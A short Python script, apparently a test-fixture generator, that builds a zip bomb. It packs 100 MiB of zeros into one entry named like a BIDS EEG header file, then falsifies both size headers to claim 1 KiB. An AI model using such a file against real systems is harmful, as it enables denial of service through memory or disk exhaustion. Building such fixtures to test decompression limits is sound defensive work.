"""Build bomb.zip: one deflated entry of 100 MiB of zeros whose headers declare 1 KiB."""
import struct, sys, zipfile, io
out = sys.argv[1]
buf = io.BytesIO()
info = zipfile.ZipInfo("sub-01/eeg/sub-01_task-rest_eeg.vhdr", date_time=(2026, 1, 1, 0, 0, 0))
info.compress_type = zipfile.ZIP_DEFLATED
with zipfile.ZipFile(buf, "w") as z:
    z.writestr(info, b"\0" * (100 * 1024 * 1024), compresslevel=9)
data = bytearray(buf.getvalue())
# Local header: uncompressed size at offset 22; central directory entry: at offset 24.
assert data[0:4] == b"PK\x03\x04"
struct.pack_into("<I", data, 22, 1024)
cd = data.rfind(b"PK\x01\x02")
struct.pack_into("<I", data, cd + 24, 1024)
open(out, "wb").write(data)
